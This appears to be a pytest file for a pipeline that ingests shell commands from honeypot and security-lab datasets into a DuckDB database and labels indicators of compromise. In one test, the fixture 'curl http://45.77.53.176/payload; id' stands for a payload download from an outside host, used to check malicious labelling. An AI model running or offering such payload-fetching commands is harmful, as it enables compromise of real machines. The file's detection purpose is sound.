"""Native dataset readers retain input occurrences independently of executions."""

import gzip
import json
import zipfile
from pathlib import Path

import duckdb
import pytest
from test_ingest_batches import invoke
from test_ingest_quasarnix_honeypot import _archive


@pytest.mark.parametrize('dataset', ['microsoft', 'cyberlab', 'quasarnix', 'honeypot', 'bots', 'kypo'])
def test_shell_observations_without_executions_and_repeated_inputs(tmp_path, dataset):
    """Parser upgrades must preserve assignment-only inputs and source repetitions."""
    inputs = ['VALUE=one', '/bin/echo same; /usr/bin/id', '/bin/echo same; /usr/bin/id']
    if dataset == 'microsoft':
        published = json.loads((Path(__file__).parent / 'fixtures/honeypot/microsoft.json').read_text())
        published[0]['Commands'] = inputs
        with zipfile.ZipFile(tmp_path / 'Microsoft.IoT-Dump-pwd-infected.zip', 'w') as archive:
            archive.writestr('Microsoft.IoT-Dump1.json', json.dumps(published))
        source = 'from _ingest_misc import microsoft_iot as records\n'
    elif dataset == 'cyberlab':
        events = [{'eventid': 'cowrie.command.input', 'input': text} for text in inputs]
        (tmp_path / 'events.json.gz').write_bytes(gzip.compress(json.dumps([{'connection': events}]).encode()))
        source = 'from _ingest_misc import cyberlab as records\n'
    elif dataset == 'quasarnix':
        from _ingest_quasarnix import FILES
        for name in FILES:
            (tmp_path / name).write_text(json.dumps(inputs if name == FILES[0] else []))
        source = 'from _ingest_quasarnix import records\n'
    elif dataset == 'honeypot':
        _archive(tmp_path, {'dataset/sessions/2021_2022.jsonl': [
            {'session_id': 'connection', 'period': '2021_2022', 'src_ip': '192.0.2.1', 'commands': inputs}]})
        source = 'from _ingest_shell_honeypot import records\n'
    elif dataset == 'bots':
        source = f'''
from _ingest_bots import history_commands
from _ingest_bots_iocs import label_ioc_commands
def records(root, options):
    for index, text in enumerate({inputs!r}):
        yield from label_ioc_commands(history_commands(text, str(index), 'connection'))
'''
    else:
        with zipfile.ZipFile(tmp_path / 'data.zip', 'w') as archive:
            archive.writestr('useractions.json', '\n'.join(json.dumps({'cmd': text, 'cmd_type': 'bash-command'}) for text in inputs))
        source = 'from _ingest_misc import kypo as records\n'
    database = tmp_path / 'observations.duckdb'
    result = invoke(tmp_path, database, source)
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database)) as con:
        shells = con.execute('SELECT shell_input,pgms FROM SHELL_INPUTS ORDER BY rowid').fetchall()
        assert shells == [(inputs[0], []), (inputs[1], ['echo', 'id']), (inputs[2], ['echo', 'id'])], 'One submitted input must remain one row, even with zero or multiple executions'
        assert con.execute('SELECT pgm,args FROM PROCESS_LAUNCHES ORDER BY rowid').fetchall() == [('/bin/echo', ['same']), ('/usr/bin/id', [])] * 2
        assert con.execute('SELECT count(DISTINCT record_id) FROM SHELL_INPUTS').fetchone() == (3,)


def test_bots_iocs_label_nested_launches_and_the_observed_input(tmp_path):
    """IOC labeling must still inspect actual argv after history becomes an input row."""
    source = '''
from _ingest_bots import history_commands
from _ingest_bots_iocs import label_ioc_commands
def records(root, options):
    yield from label_ioc_commands(history_commands('curl http://45.77.53.176/payload; id', 'ioc', 'connection'))
'''
    database = tmp_path / 'observations.duckdb'
    result = invoke(tmp_path, database, source)
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database)) as con:
        assert con.execute('SELECT pgm,dataset_label FROM PROCESS_LAUNCHES ORDER BY record_id').fetchall() == [('curl', 'malicious'), ('id', 'unknown')]
        assert con.execute('SELECT pgms,dataset_label FROM SHELL_INPUTS').fetchall() == [(['curl', 'id'], 'malicious')]
